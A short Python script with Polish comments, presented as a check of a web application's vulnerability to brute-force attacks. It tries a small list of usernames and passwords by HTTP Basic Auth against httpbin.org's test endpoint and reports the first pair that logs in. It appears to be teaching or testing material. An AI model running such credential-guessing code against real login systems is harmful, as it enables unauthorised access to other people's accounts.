# SKRYP SPRAWDZAJĄCY APLIKACJĘ WEBOWĄ POD KĄTEM PODATNOŚCI NA ATAKI BRUTE FORCE

# import biblioteki requests - do wysyłania zapytań HTTP
import requests
# biblioteka generująca wszystkie kombinacje login + hasło
from itertools import product
# import do obsługi HTTP Basic Auth
from requests.auth import HTTPBasicAuth

# wybieramy adres strony, którą sprawdzimy
url = "https://httpbin.org/basic-auth/user/passwd"

usernames = ["admin", "user"]  # lista możliwych użytkowników
passwords = ["1234", "password", "admin", "passwd"]  # lista możliwych haseł

# testowanie wszystkich kombinacji hasło + login
for username, password in product(usernames, passwords):
    try:
        # wysłanie żądania logowania za pomocą GET z HTTP Basic Auth i timeoutem 5 sekund
        response = requests.get(url, auth=HTTPBasicAuth(username, password), timeout=5)
    except requests.RequestException as e:
        print(f"Błąd połączenia dla {username}:{password} - {e}")
        continue

    print(f"Test: {username}:{password} => Status: {response.status_code}")

    # Sprawdzenie czy logowanie się powiodło - kod 200 oznacza sukces
    if response.status_code == 200:
        print(f"Zalogowano pomyślnie: {username}:{password}")
        break
